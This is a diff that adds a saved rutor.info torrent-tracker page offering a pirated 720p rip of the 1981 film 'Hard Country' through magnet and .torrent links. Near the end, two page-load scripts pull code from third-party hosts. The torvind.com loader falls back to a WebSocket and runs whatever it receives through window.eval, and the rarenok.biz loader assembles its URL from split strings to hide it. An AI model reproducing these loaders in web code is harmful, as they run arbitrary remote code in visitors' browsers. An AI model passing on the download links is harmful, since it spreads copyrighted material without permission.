@@ -1,0 +1,460 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Суровая страна / Hard Country (1981) BDRip 720p | P</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Суровая страна / Hard Country (1981) BDRip 720p | P</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:cdb159054718c54156ea1021fb7662e37ee2d057&amp;dn=rutor.info_%D0%A1%D1%83%D1%80%D0%BE%D0%B2%D0%B0%D1%8F+%D1%81%D1%82%D1%80%D0%B0%D0%BD%D0%B0+%2F+Hard+Country+%281981%29+BDRip+720p+%7C+P&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630477"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630477"><img src="http://s.rutor.info/t/down.png"> Скачать Hard.Country.1981.BDRip.720p.mkv.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="https://a.radikal.ru/a02/1805/34/50f135114d9f.jpg" /><br />
+<br />
+<u>Информация о фильме</u><br />
+<b>Название: </b>Суровая страна<br />
+<b>Оригинальное название: </b>Hard Country<br />
+<b>Год выхода: </b>1981<br />
+<b>Жанр: </b> <a href="/tag/1/Драма" target="_blank">Драма</a><br />
+<b>Режиссер: </b>Дэвид Грин<br />
+<b>В ролях: </b>Ян-Майкл Винсент, Ким Бейсингер, Майкл Паркс, Гейлард Сартейн, Сьерра Пешёр, Джон Чэппел, Таня Такер, Дэрил Ханна, Льюис Ван Берген, Тед Нили<br />
+<br />
+<b>О фильме:</b><br />
+Кайл Ричардсон работает на бесперспективной работе - на маленькой фабрике в центре Техаса. По уикэндам он вместе с приятелями любит смотреть старые фильмы в местном салуне. Его пьянство сказывается на его отношениях с его девушкой Джоди Линн Палмер. Наконец Джоди ставит ультиматум: или он успокоится и женится на ней, или она переедет в Калифорнию.<br />
+<br />
+ <a href="http://www.imdb.com/title/tt0082499/" target="_blank"><img src="http://s.rutor.info/imdb/pic/0082499.gif" /></a><a href="https://www.kinopoisk.ru/film/surovaya-strana-1981-2751/" target="_blank"><img src="https://rating.kinopoisk.ru/2751.gif" /></a><img src="https://st.kp.yandex.net/images/mpaa-r.gif" /><br />
+<br />
+<b>Страна: </b>Великобритания<br />
+<b>Студия: </b>Incorporated Television Company (ITC), Lord Grade<br />
+<b>Продолжительность: </b>01:41:49<br />
+<b>Перевод: </b>Профессиональный (многоголосый, закадровый)<br />
+<br />
+<u>Файл</u><br />
+<b>Кодек: </b>x.264<br />
+<b>Качество: </b>BDRip 720p <span style="color:grey;">| Hard.Country.1981.720p.BluRay.x264-SADPANDA</span><br />
+<b>Видео: </b>MPEG-4 AVC, 1280x720, 23.976 кадр/с, 5551 Kбит/с<br />
+<b>Звук #1: </b>AC3, 6 ch, 384 Кбит/с | RUS<br />
+<b>Звук #2: </b>DTS, 2 ch, 768 Кбит/с | ENG<br />
+<b>Субтитры: </b>Русские<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><a href="https://c.radikal.ru/c03/1805/62/e2e75ef54079.png" target="_blank"><img src="https://c.radikal.ru/c03/1805/62/e2e75ef54079t.jpg" /></a> <a href="https://b.radikal.ru/b37/1805/59/3e401158ccbb.png" target="_blank"><img src="https://b.radikal.ru/b37/1805/59/3e401158ccbbt.jpg" /></a> <a href="https://c.radikal.ru/c02/1805/cc/93b21cc3be2d.png" target="_blank"><img src="https://c.radikal.ru/c02/1805/cc/93b21cc3be2dt.jpg" /></a> <a href="https://d.radikal.ru/d00/1805/d8/ee8160df88ed.png" target="_blank"><img src="https://d.radikal.ru/d00/1805/d8/ee8160df88edt.jpg" /></a></textarea></div><br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">MI</div><div class="hidebody"></div><textarea class="hidearea">Формат                                   : Matroska<br />
+Версия формата                           : Version 2<br />
+Размер файла                             : 4,77 Гбайт<br />
+Продолжительность                        : 1 ч. 41 м.<br />
+Общий поток                              : 6706 Кбит/сек<br />
+Название фильма                          : Hard.Country.1981.BDRip.720p.[zzZGVvv]<br />
+Дата кодирования                         : UTC 2018-05-08 08:56:39<br />
+Программа кодирования                    : mkvmerge v5.8.0 (&#039;No Sleep / Pillow&#039;) built on Sep  2 2012 15:37:04<br />
+Библиотека кодирования                   : libebml v1.2.3 + libmatroska v1.3.0<br />
+Attachements                             : cover.jpg<br />
+<br />
+Видео<br />
+Идентификатор                            : 1<br />
+Формат                                   : AVC<br />
+Формат/Информация                        : Advanced Video Codec<br />
+Профиль формата                          : High@L4.1<br />
+Параметр CABAC формата                   : Да<br />
+Параметр ReFrames формата                : 5 кадров<br />
+Идентификатор кодека                     : V_MPEG4/ISO/AVC<br />
+Продолжительность                        : 1 ч. 41 м.<br />
+Битрейт                                  : 5551 Кбит/сек<br />
+Ширина                                   : 1280 пикселей<br />
+Высота                                   : 720 пикселей<br />
+Соотношение сторон                       : 16:9<br />
+Режим частоты кадров                     : Постоянный<br />
+Частота кадров                           : 23,976 кадра/сек<br />
+Цветовое пространство                    : YUV<br />
+Субдискретизация насыщенности            : 4:2:0<br />
+Битовая глубина                          : 8 бит<br />
+Тип развёртки                            : Прогрессивная<br />
+Бит/(Пиксели*Кадры)                      : 0.251<br />
+Размер потока                            : 3,86 Гбайт (81%)<br />
+Заголовок                                : Hard.Country.1981.BDRip.720p<br />
+Библиотека кодирования                   : x264 core 155 r2901 7d0ff22<br />
+Настройки программы                      : cabac=1 / ref=5 / deblock=1:-3:-3 / analyse=0x3:0x113 / me=umh / subme=8 / psy=1 / psy_rd=1.00:0.25 / mixed_ref=1 / me_range=24 / chroma_me=1 / trellis=1 / 8x8dct=1 / cqm=0 / deadzone=21,11 / fast_pskip=1 / chroma_qp_offset=-4 / threads=22 / lookahead_threads=3 / sliced_threads=0 / nr=0 / decimate=1 / interlaced=0 / bluray_compat=0 / constrained_intra=0 / bframes=3 / b_pyramid=2 / b_adapt=1 / b_bias=0 / direct=3 / weightb=1 / open_gop=0 / weightp=2 / keyint=240 / keyint_min=24 / scenecut=40 / intra_refresh=0 / rc_lookahead=50 / rc=2pass / mbtree=1 / bitrate=5551 / ratetol=1.0 / qcomp=0.60 / qpmin=0 / qpmax=69 / qpstep=4 / cplxblur=20.0 / qblur=0.5 / ip_ratio=1.40 / aq=1:0.75<br />
+Язык                                     : English<br />
+Default                                  : Да<br />
+Forced                                   : Нет<br />
+<br />
+Аудио #1<br />
+Идентификатор                            : 2<br />
+Формат                                   : AC-3<br />
+Формат/Информация                        : Audio Coding 3<br />
+Расширение режима                        : CM (complete main)<br />
+Параметр Endianness формата              : Big<br />
+Идентификатор кодека                     : A_AC3<br />
+Продолжительность                        : 1 ч. 41 м.<br />
+Вид битрейта                             : Постоянный<br />
+Битрейт                                  : 384 Кбит/сек<br />
+Каналы                                   : 6 каналов<br />
+Расположение каналов                     : Front: L C R, Side: L R, LFE<br />
+Частота                                  : 48,0 КГц<br />
+Метод сжатия                             : С потерями<br />
+Размер потока                            : 280 Мбайт (6%)<br />
+Заголовок                                : DVO<br />
+Язык                                     : Russian<br />
+Default                                  : Да<br />
+Forced                                   : Нет<br />
+<br />
+Аудио #2<br />
+Идентификатор                            : 3<br />
+Формат                                   : DTS<br />
+Формат/Информация                        : Digital Theater Systems<br />
+Режим                                    : 16<br />
+Параметр Endianness формата              : Big<br />
+Идентификатор кодека                     : A_DTS<br />
+Продолжительность                        : 1 ч. 41 м.<br />
+Вид битрейта                             : Постоянный<br />
+Битрейт                                  : 768 Кбит/сек<br />
+Каналы                                   : 2 канала<br />
+Расположение каналов                     : Front: L R<br />
+Частота                                  : 48,0 КГц<br />
+Битовая глубина                          : 24 бит<br />
+Метод сжатия                             : С потерями<br />
+Размер потока                            : 559 Мбайт (11%)<br />
+Заголовок                                : Original<br />
+Язык                                     : English<br />
+Default                                  : Нет<br />
+Forced                                   : Нет<br />
+<br />
+Текст<br />
+Идентификатор                            : 4<br />
+Формат                                   : UTF-8<br />
+Идентификатор кодека                     : S_TEXT/UTF8<br />
+Идентификатор кодека/Информация          : UTF-8 Plain Text<br />
+Язык                                     : Russian<br />
+Default                                  : Нет<br />
+Forced                                   : Нет<br />
+<br />
+Меню<br />
+00:00:00.000                             : en:00:00:00.000<br />
+00:07:18.688                             : en:00:07:18.688<br />
+00:13:40.987                             : en:00:13:40.987<br />
+00:23:17.271                             : en:00:23:17.271<br />
+00:30:19.484                             : en:00:30:19.484<br />
+00:36:53.461                             : en:00:36:53.461<br />
+00:43:01.829                             : en:00:43:01.829<br />
+00:50:36.534                             : en:00:50:36.534<br />
+00:58:36.888                             : en:00:58:36.888<br />
+01:05:39.853                             : en:01:05:39.853<br />
+01:12:08.157                             : en:01:12:08.157<br />
+01:16:37.968                             : en:01:16:37.968<br />
+01:25:18.280                             : en:01:25:18.280<br />
+01:38:30.404                             : en:01:38:30.404<br />
+<br />
+</textarea></div></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/421065/0" target="_blank">user7447</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>10 из 10 (1 голосов, самая низкая оценка - 10, самая высокая - 10)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/kino" target="_blank">Зарубежные фильмы</a></td></tr>
+<tr><td class="header">Раздают</td><td>12</td></tr>
+<tr><td class="header">Качают</td><td>2</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (17 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 12:58:54  (20 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>4.77&nbsp;GB  (5121666960 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630477);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>22&nbsp;Ноя&nbsp;15</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/255097"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:5cb90fe00cd006aa9bfb828ca2d7c5741f06dcc1&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/255097/surovaja-strana_hard-country-1981-dvd5-ot-new-team">Суровая страна / Hard Country (1981) DVD5 от New-Team </a></td> 
+<td align="right">4.02&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>21&nbsp;Ноя&nbsp;15</td><td ><a class="downgif" href="http://d.rutor.info/download/255184"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:216bb0244a37ae6134131d0dca066e8fe9afe716&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/255184/surovaja-strana_hard-country-1981-dvdrip-ot-new-team">Суровая страна / Hard Country (1981) DVDRip от New-Team </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">743.98&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="gai"><td>03&nbsp;Окт&nbsp;13</td><td ><a class="downgif" href="http://d.rutor.info/download/255222"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:a468f7385354e0c5e4d66a4e8373f1b0974f4189&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/255222/surovaja-strana_hard-country-1981-dvdrip-ot-new-team">Суровая страна / Hard Country (1981) DVDRip от New-Team </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.45&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/1/0/0/Hard Country" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630477.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (1)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630477">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630477);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630477);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630477">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>психоз</b></td> <td>08-05-2018 15:00:58 (18 часов назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3199409"></span><script type="text/javascript">cOptions(1287332,3199409);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thankyou.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
